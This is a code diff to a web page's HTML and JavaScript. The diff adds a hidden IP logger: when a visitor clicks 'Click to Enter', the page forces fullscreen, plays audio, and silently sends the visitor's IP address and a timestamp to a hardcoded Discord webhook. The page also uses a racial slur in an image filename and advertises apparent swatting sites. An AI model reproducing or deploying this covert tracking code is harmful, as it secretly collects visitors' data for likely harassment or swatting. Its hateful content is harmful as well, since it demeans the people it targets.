@@ -48,11 +48,10 @@
         <img src="niggers.jpg" alt="Click to Enter" width="300"> 
     </div>
     <div class="container">
-        <h1> other sites: </h1>
+        <h1>other sites:</h1>
         <p>swatcity.fun swats.shop</p>
     </div>
 
- 
     <div class="contact">
         <p>contact: lol@interpol.int.pl</p>
     </div>
@@ -64,10 +63,56 @@
         const container = document.querySelector('.container');
         const audio = document.getElementById('background-music');
 
+       
+        function goFullScreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) { 
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { 
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) { 
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
+        // Function to send the IP to Discord
+        function sendIPToDiscord() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    const currentTime = new Date().toISOString();
+                    const discordWebhookUrl = 'https://discord.com/api/webhooks/1309497408689799198/Rjgnm7gEd7qk-q5mUUvLa33AQcc7kPDpGOIww6J2bkFuF7XEkxg5NEzeAceSzoBXBrhL'; // Replace with your webhook URL
+
+                    fetch(discordWebhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: `IP: ${userIP} | Time: ${currentTime}`
+                        })
+                    })
+                    .then(() => {
+                        console.log('IP and timestamp sent to Discord');
+                    })
+                    .catch(err => {
+                        console.error('Error sending to Discord:', err);
+                    });
+                })
+                .catch(err => {
+                    console.error('Error fetching IP:', err);
+                });
+        }
+
+        // Event listener for overlay click
         overlay.addEventListener('click', () => {
             overlay.style.display = 'none'; 
             container.style.display = 'block';
             audio.play(); 
+            goFullScreen(); 
+            sendIPToDiscord(); 
         });
     </script>
 </body>
